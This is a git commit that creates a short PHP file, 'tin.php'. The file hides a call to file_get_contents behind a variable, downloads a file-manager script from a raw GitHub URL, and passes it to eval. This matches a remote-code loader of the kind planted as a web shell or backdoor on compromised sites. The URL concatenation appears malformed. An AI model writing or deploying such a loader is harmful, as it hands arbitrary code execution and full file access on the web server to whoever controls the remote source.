1a4d8091580dd3f52075b8f9f4408b179a08a047
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-02-24 04:09:16 +0700

    Create tin.php

---
+++ tin.php
@@ -0,0 +1,7 @@
+<?php
+$awo = 'https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php';
+  $fgt = 'file_get_contents';
+   $data = $fgt($awo . 'tinyfilemanager.php');
+     $admin = '?>';
+        eval($admin . $data);
+        exit;?>
